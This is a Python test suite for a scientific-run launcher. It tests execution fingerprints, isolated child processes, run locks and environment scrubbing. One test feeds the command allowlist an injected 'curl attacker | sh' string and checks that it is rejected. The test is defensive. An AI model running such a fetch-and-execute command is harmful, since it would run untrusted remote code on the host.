from __future__ import annotations

import os
import subprocess
import sys
from dataclasses import asdict, replace
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SRC_DIR = REPO_ROOT / "src"


def test_subprocess_resolves_to_local_checkout() -> None:
    """Validate INF-05 invariant: subprocesses resolve packages from this checkout."""
    script = "import symbiont, symbiont_lab; print(symbiont.__file__); print(symbiont_lab.__file__)"
    result = subprocess.run(
        [sys.executable, "-c", script],
        capture_output=True,
        text=True,
        check=True,
        env=os.environ,
    )
    lines = [line.strip() for line in result.stdout.strip().splitlines() if line.strip()]
    assert len(lines) == 2, f"Expected 2 paths, got: {result.stdout}"

    symbiont_file = Path(lines[0]).resolve()
    symbiont_lab_file = Path(lines[1]).resolve()

    expected_src = SRC_DIR.resolve()
    assert str(symbiont_file).startswith(str(expected_src)), (
        f"symbiont was resolved to '{symbiont_file}', expected under '{expected_src}'"
    )
    assert str(symbiont_lab_file).startswith(str(expected_src)), (
        f"symbiont_lab was resolved to '{symbiont_lab_file}', expected under '{expected_src}'"
    )


def test_execution_fingerprint_captures_active_runtime() -> None:
    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    fp = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config={"alpha": 1, "nested": {"beta": True}},
        experiment_id="unit-hermetic",
        seed=17,
    )
    assert fp.is_hermetic_to(REPO_ROOT)
    assert fp.repo_root == str(REPO_ROOT.resolve())
    assert Path(fp.python_executable).is_file()
    assert fp.python_executable == str(Path(sys.executable).resolve())
    assert len(fp.git_commit) == 40 or fp.git_commit != "unknown"
    assert Path(fp.symbiont_file).is_file()
    assert Path(fp.symbiont_lab_file).is_file()
    assert len(fp.dependency_lock_hash) == 64
    assert fp.dependency_lock_hash != "missing"
    assert len(fp.effective_config_hash) == 64
    assert fp.experiment_id == "unit-hermetic"
    assert fp.seed == 17


def test_execution_fingerprint_is_canonical_for_config_key_order() -> None:
    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    left = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config={"b": 2, "a": 1},
        experiment_id="canonical",
        seed=3,
    )
    right = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config={"a": 1, "b": 2},
        experiment_id="canonical",
        seed=3,
    )
    assert left.effective_config_hash == right.effective_config_hash
    assert left.mismatches(right) == ()


def test_execution_fingerprint_rejects_declared_environment_mismatch() -> None:
    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    declared = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config={"arm": "A"},
        experiment_id="identity-test",
        seed=101,
    )
    child = replace(declared, dependency_lock_hash="0" * 64)

    assert child.mismatches(declared) == ("dependency_lock_hash",)
    with pytest.raises(RuntimeError, match="dependency_lock_hash"):
        child.assert_matches_declared(declared)


def test_execution_fingerprint_in_isolated_subprocess() -> None:
    code = (
        "import json, sys\n"
        "from symbiont_lab.experiments.manifest import ExecutionFingerprint\n"
        "fp = ExecutionFingerprint.capture()\n"
        "print(json.dumps({\n"
        "    'hermetic': fp.is_hermetic_to(sys.argv[1]),\n"
        "    'executable': fp.python_executable,\n"
        "}))\n"
    )
    result = subprocess.run(
        [sys.executable, "-c", code, str(REPO_ROOT)],
        capture_output=True,
        text=True,
        check=True,
        env=os.environ,
    )
    import json

    data = json.loads(result.stdout.strip())
    assert data["hermetic"] is True
    assert data["executable"] == str(Path(sys.executable).resolve())


def test_isolated_subprocess_verifies_declared_execution_fingerprint() -> None:
    import json

    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    declared = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config={"case": "child-verification"},
        experiment_id="child-verification",
        seed=29,
    )
    assert declared.python_prefix == str(Path(sys.prefix).resolve())
    assert declared.python_base_prefix == str(Path(sys.base_prefix).resolve())
    assert "python_prefix" in replace(declared, python_prefix="/different/venv").mismatches(
        declared
    )
    assert "python_base_prefix" in replace(
        declared, python_base_prefix="/different/base"
    ).mismatches(declared)
    code = (
        "import json, sys\n"
        "from symbiont_lab.experiments.manifest import ExecutionFingerprint\n"
        "declared = ExecutionFingerprint(**json.loads(sys.argv[1]))\n"
        "actual = ExecutionFingerprint.capture(\n"
        "    declared.repo_root,\n"
        "    effective_config={'case': 'child-verification'},\n"
        "    experiment_id='child-verification', seed=29,\n"
        ")\n"
        "actual.assert_matches_declared(declared)\n"
        "print('verified')\n"
    )
    result = subprocess.run(
        [sys.executable, "-c", code, json.dumps(asdict(declared))],
        capture_output=True,
        text=True,
        check=True,
        env=os.environ,
    )
    assert result.stdout.strip() == "verified"


def test_verified_child_checks_identity_before_running_target(monkeypatch) -> None:
    import json
    from dataclasses import asdict, replace

    from symbiont_lab.experiments.manifest import ExecutionFingerprint
    from symbiont_lab.experiments.verified_child import run_verified

    config = {"case": "verified-child"}
    declared = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config=config,
        experiment_id="verified-child",
        seed=41,
    )
    monkeypatch.setenv("SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT", json.dumps(asdict(declared)))
    monkeypatch.setenv("SYMBIONT_EFFECTIVE_CONFIG", json.dumps(config))
    monkeypatch.setenv("SYMBIONT_EXPERIMENT_ID", "verified-child")
    monkeypatch.setenv("SYMBIONT_SEED", "41")

    run_verified(["code", "assert __name__ == '__main__'"])

    monkeypatch.setenv(
        "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT",
        json.dumps(asdict(replace(declared, dependency_lock_hash="0" * 64))),
    )
    with pytest.raises(RuntimeError, match="dependency_lock_hash"):
        run_verified(["code", "raise AssertionError('target ran before verification')"])

    monkeypatch.setenv(
        "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT",
        json.dumps(asdict(replace(declared, python_prefix="/different/venv"))),
    )
    with pytest.raises(RuntimeError, match="python_prefix"):
        run_verified(["code", "raise AssertionError('target ran before prefix verification')"])


def test_verified_child_subprocess_blocks_mismatch_before_target() -> None:
    import json
    from dataclasses import asdict, replace

    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    config = {"case": "verified-child-subprocess"}
    declared = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config=config,
        experiment_id="verified-child-subprocess",
        seed=43,
    )
    env = os.environ.copy()
    env.update(
        {
            "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT": json.dumps(
                asdict(replace(declared, dependency_lock_hash="0" * 64))
            ),
            "SYMBIONT_EFFECTIVE_CONFIG": json.dumps(config),
            "SYMBIONT_EXPERIMENT_ID": "verified-child-subprocess",
            "SYMBIONT_SEED": "43",
        }
    )
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "symbiont_lab.experiments.verified_child",
            "code",
            "print('study target executed')",
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode != 0
    assert "dependency_lock_hash" in result.stderr
    assert "study target executed" not in result.stdout


@pytest.mark.parametrize("mode", ["script", "module", "code"])
def test_verified_child_preserves_python_entrypoint_semantics(tmp_path, mode: str) -> None:
    import json

    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    config = {"case": "entrypoint-semantics"}
    declared = ExecutionFingerprint.capture(
        REPO_ROOT,
        effective_config=config,
        experiment_id="entrypoint-semantics",
        seed=47,
    )
    target = "import json, sys; print(json.dumps({'argv': sys.argv, 'path0': sys.path[0], 'main': __name__}))"
    expected_argv = ["-c", "arg"]
    if mode == "script":
        script = tmp_path / "target.py"
        script.write_text(target, encoding="utf-8")
        entry = ["script", str(script), "arg"]
        expected_argv = [str(script), "arg"]
        expected_path0 = str(tmp_path)
    elif mode == "module":
        module = tmp_path / "target_module.py"
        module.write_text(target, encoding="utf-8")
        entry = ["module", "target_module", "arg"]
        expected_argv = [str(module), "arg"]
        expected_path0 = str(REPO_ROOT)
    else:
        entry = ["code", target, "arg"]
        expected_path0 = ""

    env = os.environ.copy()
    env.update(
        {
            "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT": json.dumps(asdict(declared)),
            "SYMBIONT_EFFECTIVE_CONFIG": json.dumps(config),
            "SYMBIONT_EXPERIMENT_ID": "entrypoint-semantics",
            "SYMBIONT_SEED": "47",
        }
    )
    if mode == "module":
        env["PYTHONPATH"] = os.pathsep.join([str(tmp_path), str(SRC_DIR)])
    result = subprocess.run(
        [sys.executable, "-m", "symbiont_lab.experiments.verified_child", *entry],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    import json

    observed = json.loads(result.stdout.strip())
    assert observed == {"argv": expected_argv, "path0": expected_path0, "main": "__main__"}


def test_verified_child_propagates_target_exit_code(monkeypatch) -> None:
    import json

    from symbiont_lab.experiments.manifest import ExecutionFingerprint

    config = {"case": "exit-code"}
    declared = ExecutionFingerprint.capture(
        REPO_ROOT, effective_config=config, experiment_id="exit-code", seed=53
    )
    env = os.environ.copy()
    env.update(
        {
            "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT": json.dumps(asdict(declared)),
            "SYMBIONT_EFFECTIVE_CONFIG": json.dumps(config),
            "SYMBIONT_EXPERIMENT_ID": "exit-code",
            "SYMBIONT_SEED": "53",
        }
    )
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "symbiont_lab.experiments.verified_child",
            "code",
            "raise SystemExit(19)",
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 19


@pytest.mark.parametrize("mode", ["script", "module", "code"])
@pytest.mark.parametrize("input_mode", ["snapshot", "protocol-generated"])
def test_agentctl_run_start_records_verified_child_receipt(
    tmp_path, monkeypatch, mode: str, input_mode: str
) -> None:
    import contextlib
    import importlib.util
    import json
    from types import SimpleNamespace

    spec = importlib.util.spec_from_file_location(
        "agentctl_under_test", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    marker = tmp_path / f"{mode}.marker"
    monkeypatch.setenv("SYMBIONT_TEST_SECRET", "must-not-reach-study")
    if mode == "script":
        target_file = tmp_path / "study.py"
        target_file.write_text(
            "import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; "
            + (
                "assert 'SYMBIONT_RUN_INPUT' not in os.environ; "
                if input_mode == "protocol-generated"
                else ""
            )
            + f"assert __import__('json').loads(os.environ['SYMBIONT_EFFECTIVE_CONFIG'])['scientific_input']['mode'] == '{input_mode}'; "
            + "assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); "
            f"from pathlib import Path; Path({str(marker)!r}).write_text('ran')",
            encoding="utf-8",
        )
        command = [sys.executable, str(target_file)]
    elif mode == "module":
        command = [
            sys.executable,
            "-m",
            "timeit",
            "-n",
            "1",
            "-r",
            "1",
            "import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; "
            + (
                "assert 'SYMBIONT_RUN_INPUT' not in os.environ; "
                if input_mode == "protocol-generated"
                else ""
            )
            + f"assert __import__('json').loads(os.environ['SYMBIONT_EFFECTIVE_CONFIG'])['scientific_input']['mode'] == '{input_mode}'; "
            + f"assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); open({str(marker)!r}, 'w').write('ran')",
        ]
    else:
        command = [
            sys.executable,
            "-c",
            "import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; "
            + (
                "assert 'SYMBIONT_RUN_INPUT' not in os.environ; "
                if input_mode == "protocol-generated"
                else ""
            )
            + f"assert __import__('json').loads(os.environ['SYMBIONT_EFFECTIVE_CONFIG'])['scientific_input']['mode'] == '{input_mode}'; "
            + "assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); "
            f"from pathlib import Path; Path({str(marker)!r}).write_text('ran')",
        ]

    run_root = tmp_path / "runs"
    lock_path = tmp_path / "run.lock"
    commit = agentctl.git("rev-parse", "HEAD")
    manifest = {
        "source_commit": commit,
        "schema_version": 1,
        "organism_sha256": "a" * 64,
        "body_sha256": "b" * 64,
        "bundle_models_tree_sha256": "c" * 64,
        "models_tree_sha256": "d" * 64,
        "body_kind": "test",
    }

    @contextlib.contextmanager
    def pinned_worktree(_root, _commit):
        pinned = tmp_path / "pinned-checkout"
        subprocess.run(
            ["git", "worktree", "add", "--detach", str(pinned), commit],
            cwd=REPO_ROOT,
            check=True,
            capture_output=True,
            text=True,
        )
        try:
            yield pinned
        finally:
            subprocess.run(
                ["git", "worktree", "remove", "--force", str(pinned)],
                cwd=REPO_ROOT,
                check=True,
                capture_output=True,
                text=True,
            )

    def archive_snapshot(*, destination, **_kwargs):
        destination.mkdir(parents=True)
        (destination / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        return manifest

    monkeypatch.setattr(agentctl, "commit_exists", lambda _commit: True)
    monkeypatch.setattr(agentctl, "git", lambda *args: commit if args[0] == "rev-parse" else "")
    monkeypatch.setattr(
        agentctl, "_equivalence_lock_path", lambda: tmp_path / "no-equivalence.lock"
    )
    monkeypatch.setattr(agentctl, "_trusted_origin_ref", lambda: commit)
    monkeypatch.setattr(agentctl, "_trusted_governance_at", lambda *_args: {"scientific_runs": {}})
    monkeypatch.setattr(agentctl, "_tracked_running_at", lambda _ref: [])
    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: lock_path)
    monkeypatch.setattr(agentctl, "_reserve_run_lock", lambda _payload: 0)
    monkeypatch.setattr(agentctl, "runtime_dir", lambda: run_root)
    monkeypatch.setattr(
        agentctl,
        "assess_resources",
        lambda *_args, **_kwargs: SimpleNamespace(
            allowed=True,
            available_memory_gb=16.0,
            free_disk_gb=16.0,
            available_cpu_threads=4,
            reasons=(),
        ),
    )
    monkeypatch.setattr(agentctl, "archive_snapshot", archive_snapshot)
    monkeypatch.setattr(agentctl, "pinned_worktree", pinned_worktree)
    monkeypatch.setattr(agentctl, "_scientific_preexec", lambda *_args: None)

    result = agentctl.run_pinned(
        commit=commit,
        run_id=f"launcher-{mode}",
        scope="development",
        input_mode=input_mode,
        snapshot_source=tmp_path / "input-source" if input_mode == "snapshot" else None,
        snapshot_source_commit=commit if input_mode == "snapshot" else None,
        command=command,
        experiment_id=f"launcher-{mode}",
        seed=59,
        extras=[],
        wall_minutes=2,
        memory_gb=4,
        cpu=1,
        disk_gb=1,
    )
    assert result == 0
    assert marker.read_text(encoding="utf-8") == "ran"
    receipt = json.loads((run_root / "runs" / f"launcher-{mode}" / "execution.json").read_text())
    fingerprint = receipt["execution_fingerprint"]
    assert fingerprint["git_commit"] == commit
    assert fingerprint["is_dirty"] is False
    assert fingerprint["seed"] == 59
    assert fingerprint["experiment_id"] == f"launcher-{mode}"
    assert len(fingerprint["effective_config_hash"]) == 64
    assert receipt["dependency_extras"] == []
    assert receipt["scientific_input"]["mode"] == input_mode
    assert receipt["scientific_input"]["external_state"] is (input_mode == "snapshot")
    assert receipt["seed"] == 59
    assert Path(receipt["environment_path"]).is_dir()
    assert Path(fingerprint["python_executable"]).is_absolute()


def test_scientific_sync_command_is_locked_and_keeps_compatibility_dependencies_out() -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_under_test", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)

    command = agentctl._scientific_sync_command(
        "uv", Path("/pinned"), "/python", ["physics3d", "modeling", "physics3d"]
    )
    assert command[:4] == ["uv", "sync", "--locked", "--no-dev"]
    assert command[-4:] == ["--extra", "modeling", "--extra", "physics3d"]
    assert "dev" not in command


@pytest.mark.parametrize("invalid_kind", ["non-python", "other-interpreter"])
def test_agentctl_run_start_rejects_invalid_command_before_preflight(
    tmp_path, monkeypatch, invalid_kind: str
) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_under_test", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    if invalid_kind == "non-python":
        command = ["sh", "-c", "echo must-not-run"]
    else:
        alternate = tmp_path / "python3"
        alternate.symlink_to("/bin/true")
        command = [str(alternate), "-c", "pass"]

    def unexpected_preflight(*_args, **_kwargs):
        pytest.fail("invalid command reached scientific preflight")

    monkeypatch.setattr(agentctl, "commit_exists", unexpected_preflight)
    result = agentctl.run_pinned(
        commit="not-inspected",
        run_id="invalid-command",
        scope="development",
        input_mode="snapshot",
        snapshot_source=tmp_path,
        snapshot_source_commit=None,
        command=command,
        experiment_id="invalid-command",
        seed=61,
        extras=[],
        wall_minutes=1,
        memory_gb=1,
        cpu=1,
        disk_gb=1,
    )
    assert result == 2


def test_run_setup_failure_keeps_non_execution_attempt_receipt(tmp_path, monkeypatch) -> None:
    import importlib.util
    import json
    from types import SimpleNamespace

    spec = importlib.util.spec_from_file_location(
        "agentctl_setup_failure", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    commit = "a" * 40
    run_root = tmp_path / "runtime"

    monkeypatch.setattr(agentctl, "commit_exists", lambda _value: True)
    monkeypatch.setattr(agentctl, "git", lambda *_args: commit)
    monkeypatch.setattr(agentctl, "_equivalence_lock_path", lambda: tmp_path / "no-eq-lock")
    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: tmp_path / "no-run-lock")
    monkeypatch.setattr(agentctl, "_trusted_origin_ref", lambda: commit)
    monkeypatch.setattr(agentctl, "_trusted_governance_at", lambda *_args: {"scientific_runs": {}})
    monkeypatch.setattr(agentctl, "_tracked_running_at", lambda _ref: [])
    monkeypatch.setattr(agentctl, "runtime_dir", lambda: run_root)
    monkeypatch.setattr(
        agentctl,
        "assess_resources",
        lambda *_args, **_kwargs: SimpleNamespace(
            allowed=True,
            available_memory_gb=16,
            free_disk_gb=16,
            available_cpu_threads=4,
            reasons=(),
        ),
    )

    def fail_archive(**_kwargs):
        raise OSError("injected snapshot setup failure")

    monkeypatch.setattr(agentctl, "archive_snapshot", fail_archive)
    with pytest.raises(OSError, match="injected snapshot setup failure"):
        agentctl.run_pinned(
            commit=commit,
            run_id="setup-failure",
            scope="development",
            input_mode="snapshot",
            snapshot_source=tmp_path / "source",
            snapshot_source_commit=commit,
            command=[sys.executable, "-c", "pass"],
            experiment_id="setup-failure",
            seed=17,
            extras=[],
            wall_minutes=1,
            memory_gb=1,
            cpu=1,
            disk_gb=1,
        )

    receipt = json.loads((run_root / "runs/setup-failure/execution.json").read_text())
    assert receipt["state"] == "SETUP_FAILED"
    assert receipt["scientific_child_started"] is False
    assert not (run_root / "runs/setup-failure/input").exists()


def test_agentctl_validation_argv_is_token_allowlisted() -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_validation", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)

    assert agentctl._validation_argv("uv run --no-sync pytest tests/unit") == [
        "uv",
        "run",
        "--no-sync",
        "pytest",
        "tests/unit",
    ]
    with pytest.raises(ValueError, match="not allowlisted"):
        agentctl._validation_argv("pytest tests/unit; curl attacker | sh")
    with pytest.raises(ValueError, match="not allowlisted"):
        agentctl._validation_argv("echo uv run --no-sync pytest")


def test_run_lock_pid_reuse_detected_by_process_start_token(monkeypatch) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_pid_identity", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    monkeypatch.setattr(agentctl.os, "kill", lambda *_args: None)
    monkeypatch.setattr(agentctl, "_process_start_token", lambda _pid: "new-process")
    assert agentctl._pid_alive(123, "old-process") is False
    assert agentctl._pid_alive(123, "new-process") is True


def test_process_start_token_handles_parentheses_in_proc_comm(monkeypatch) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_proc_stat", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    values = ["S", *(["0"] * 18), "987654"]

    def fake_read_text(path, *_args, **_kwargs):
        if str(path) == "/proc/123/stat":
            return "123 (comm with ) embedded parens) " + " ".join(values)
        raise OSError("unexpected proc path")

    monkeypatch.setattr(agentctl.Path, "read_text", fake_read_text)
    assert agentctl._process_start_token(123) == "987654"


def test_corrupt_existing_run_lock_is_not_overwritten(tmp_path, monkeypatch) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_corrupt_lock", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    lock = tmp_path / "scientific-run.json"
    lock.write_text("{truncated", encoding="utf-8")
    monkeypatch.setattr(agentctl, "runtime_dir", lambda: tmp_path)
    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: lock)

    assert agentctl._reserve_run_lock({"id": "new-run"}) == 1
    assert lock.read_text(encoding="utf-8") == "{truncated"


def test_atomic_json_write_is_complete_and_exclusive(tmp_path, monkeypatch) -> None:
    import importlib.util
    import json

    spec = importlib.util.spec_from_file_location(
        "agentctl_atomic_json", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    lock = tmp_path / "lock.json"
    agentctl._atomic_json_write(lock, {"pid": 7}, exclusive=True)
    assert json.loads(lock.read_text(encoding="utf-8")) == {"pid": 7}
    with pytest.raises(FileExistsError):
        agentctl._atomic_json_write(lock, {"pid": 8}, exclusive=True)
    assert json.loads(lock.read_text(encoding="utf-8")) == {"pid": 7}

    from concurrent.futures import ThreadPoolExecutor

    concurrent_lock = tmp_path / "concurrent.json"

    def reserve(value: int) -> bool:
        try:
            agentctl._atomic_json_write(concurrent_lock, {"pid": value}, exclusive=True)
        except FileExistsError:
            return False
        return True

    with ThreadPoolExecutor(max_workers=2) as executor:
        results = list(executor.map(reserve, (10, 11)))
    assert sorted(results) == [False, True]
    assert json.loads(concurrent_lock.read_text(encoding="utf-8"))["pid"] in {10, 11}
    interrupted = tmp_path / "interrupted.json"
    monkeypatch.setattr(
        agentctl.json,
        "dump",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("injected write failure")),
    )
    with pytest.raises(OSError, match="injected write failure"):
        agentctl._atomic_json_write(interrupted, {"pid": 9}, exclusive=True)
    assert not interrupted.exists()
    assert not list(tmp_path.glob(".interrupted.json.*"))


def test_scientific_environment_ignores_inherited_symbiont_namespace(tmp_path, monkeypatch) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_clean_environment", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    monkeypatch.setenv("SYMBIONT_RUN_ID", "host-forged-run")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "host-secret")

    env = agentctl._scientific_environment(home=tmp_path / "run-home")
    assert env["HOME"] == str(tmp_path / "run-home")
    assert "SYMBIONT_RUN_ID" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env


def test_run_start_requires_separator_and_preserves_child_flags(monkeypatch, capsys) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_separator", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    prefix = [
        "agentctl.py",
        "run",
        "start",
        "--commit",
        "abc",
        "--id",
        "run",
        "--seed",
        "1",
        "--scope",
        "development",
        "--input-mode",
        "snapshot",
        "--snapshot-source",
        ".",
    ]
    monkeypatch.setattr(agentctl, "run_pinned", lambda **_kwargs: 0)
    monkeypatch.setattr(sys, "argv", [*prefix, sys.executable, "-c", "pass"])
    assert agentctl.main() == 2
    assert "requires --" in capsys.readouterr().err

    received: dict[str, object] = {}
    monkeypatch.setattr(agentctl, "run_pinned", lambda **kwargs: received.update(kwargs) or 0)
    monkeypatch.setattr(sys, "argv", [*prefix, "--", sys.executable, "-c", "pass", "--cpu", "999"])
    assert agentctl.main() == 0
    assert received["command"] == [sys.executable, "-c", "pass", "--cpu", "999"]


@pytest.mark.parametrize(
    ("input_mode", "snapshot_source", "snapshot_source_commit"),
    [
        ("protocol-generated", Path("snapshot"), None),
        ("protocol-generated", None, "abc"),
        ("snapshot", None, None),
    ],
)
def test_run_start_rejects_mixed_or_incomplete_input_provenance(
    tmp_path, monkeypatch, capsys, input_mode, snapshot_source, snapshot_source_commit
) -> None:
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "agentctl_input_mode", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    monkeypatch.setattr(agentctl, "commit_exists", lambda *_args: pytest.fail("preflight reached"))
    result = agentctl.run_pinned(
        commit="unused",
        run_id="invalid-input-provenance",
        scope="development",
        input_mode=input_mode,
        snapshot_source=snapshot_source,
        snapshot_source_commit=snapshot_source_commit,
        command=[sys.executable, "-c", "pass"],
        experiment_id="invalid-input-provenance",
        seed=1,
        extras=[],
        wall_minutes=1,
        memory_gb=1,
        cpu=1,
        disk_gb=1,
    )
    assert result == 2
    assert "snapshot mode requires" in capsys.readouterr().err


@pytest.mark.parametrize(
    ("scope", "origin", "blocked"),
    [
        ("confirmation", True, True),
        ("held-out", True, True),
        ("confirmation", None, True),
        ("confirmation", False, False),
        ("development", True, False),
    ],
)
def test_run_start_requires_a_verified_origin_for_confirmatory_scopes(
    tmp_path, monkeypatch, capsys, scope, origin, blocked
) -> None:
    import importlib.util
    from types import SimpleNamespace

    spec = importlib.util.spec_from_file_location(
        "agentctl_verified_origin", REPO_ROOT / "scripts/agentctl.py"
    )
    assert spec and spec.loader
    agentctl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(agentctl)
    commit = "a" * 40
    source = tmp_path / "source"
    source.mkdir()
    # The gate under test sits before the snapshot-source-commit check, which
    # this stub fails on purpose so a passing gate stops there, not in a run.
    answers = iter([True, False])
    monkeypatch.setattr(agentctl, "commit_exists", lambda _commit: next(answers))
    monkeypatch.setattr(agentctl, "git", lambda *_args: commit)
    monkeypatch.setattr(agentctl, "_equivalence_lock_path", lambda: tmp_path / "no.lock")
    monkeypatch.setattr(agentctl, "_trusted_origin_ref", lambda: commit)
    monkeypatch.setattr(agentctl, "_trusted_governance_at", lambda *_args: {"scientific_runs": {}})
    monkeypatch.setattr(agentctl, "_tracked_running_at", lambda _ref: [])
    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: tmp_path / "run.lock")
    monkeypatch.setattr(agentctl, "runtime_dir", lambda: tmp_path / "runs")
    monkeypatch.setattr(
        agentctl,
        "assess_resources",
        lambda *_args, **_kwargs: SimpleNamespace(
            allowed=True,
            available_memory_gb=16.0,
            free_disk_gb=16.0,
            available_cpu_threads=4,
            reasons=(),
        ),
    )
    monkeypatch.setattr(
        agentctl, "inspect_snapshot_source", lambda _source: {"unverified_legacy_origin": origin}
    )

    result = agentctl.run_pinned(
        commit=commit,
        run_id="verified-origin",
        scope=scope,
        input_mode="snapshot",
        snapshot_source=source,
        snapshot_source_commit=commit,
        command=[sys.executable, "-c", "pass"],
        experiment_id="verified-origin",
        seed=1,
        extras=[],
        wall_minutes=1,
        memory_gb=1,
        cpu=1,
        disk_gb=1,
    )

    err = capsys.readouterr().err
    assert result == 3
    assert ("require a subject of verified origin" in err) is blocked
    assert ("snapshot source commit is unavailable" in err) is not blocked
    assert not (tmp_path / "runs").exists()
